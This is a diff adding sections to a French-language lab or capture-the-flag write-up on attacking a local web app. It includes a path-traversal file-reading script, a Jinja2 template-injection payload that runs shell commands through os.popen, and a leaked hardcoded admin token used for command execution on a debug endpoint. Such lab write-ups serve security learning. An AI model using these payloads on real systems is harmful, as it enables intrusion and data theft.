@@ -152,7 +152,47 @@ MAC Address: 52:54:00:12:35:02 (QEMU virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
 ```
 ---
-### PHASE 2 - Attaque sur http://10.0.2.2:5042
+
+### UTILITAIRES 
+
+La phase d'enumeration user a requis les scripts suivant : (rendu possible par les failles exposees ensuite)  
+
+#### 1. `get_file.sh`
+- Permet de voir le contenu d'un fichier tant que l'on connait son chemin (execute avec les privileges de `/var/www/hal9042`).
+
+```bash
+#!/bin/bash
+
+if [ "$#" -eq 0 ]; then
+    echo "Usage: $0 \"<file_path>\""
+    exit 1
+fi
+
+FILE="$*"
+
+curl "http://10.0.2.2:5042/api/debug?file=$FILE"
+```
+
+#### 2. `post_evaluate.sh`
+- A remplir
+```bash
+#!/bin/bash
+
+if [ "$#" -eq 0 ]; then
+    echo "Usage: $0 \"commande shell\""
+    exit 1
+fi
+
+COMMAND="$*"
+
+# si vous reutilisez, bien modifier l'ip
+curl -s -X POST http://10.0.2.2:5042/evaluate \
+    -H "X-Debug-Render: true" \
+    --data-urlencode "project_name={{ \"\".__class__.__mro__[1].__subclasses__()[540].__init__.__globals__[\"os\"].popen(\"$COMMAND\").read() }}"
+```
+---
+### PHASE 2 - Attaque sur http://10.0.2.2:5042  
+#### A. Local File Inclusion (LFI)  
 
 Sur le navigateur, on nous sert cette page web :  
 ![image](../assets/roadmap/hal_web.png)  
@@ -191,6 +231,33 @@ app:app
 - On sait desormais que l'env virtuel Python se trouve ici : `/var/www/hal9042`
 - Si l'on cherche `curl http://10.0.2.2:5042/api/debug/../../../../var/www/hal9042/<app.py> ou <config.py>`
 - `<app.py>` : La lecture du code source nous permet de comprendre que si `f` est un chemin absolu, `os.path.join` ignore `APP_ROOT` et utilise directement le chemin fourni, on peut par exemple donner directement `?file=/etc/passwd`.
+
+#### B. Remote Code Execution  
+  
+Le fichier `config.py` nous donne `ADMIN_TOKEN` :  
+```python
+# Internal maintenance token. The /api/debug console accepts this token to run
+# diagnostic commands. Was supposed to be rotated before launch.
+ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
+```  
+Que l'on peut utiliser sur l'endpoint de debug pour executer une commande shell.  
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl 'http://10.0.2.2:5042/api/debug?cmd=ls&token=h4l_d3bug_t0k3n_2024'
+app.py
+config.py
+requirements.txt
+static
+templates
+venv                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ curl 'http://10.0.2.2:5042/api/debug?cmd=pwd&token=h4l_d3bug_t0k3n_2024'
+/var/www/hal9042
+```
+- **Obtention du secret** : La LFI demontree precedement nous permet de recuperer le token admin.
+- **Exploitation** : `/api/debug` possede une fonctionnalite d'execution de commandes systeme qui requiert une auth via le queryParam `token`.
+- **RCE** : On contourne la restriction de securite et execute arbitrairement des commandes shell avec les privileges de `/www/var/hal9042`
+
 
 ## BILAN :
 
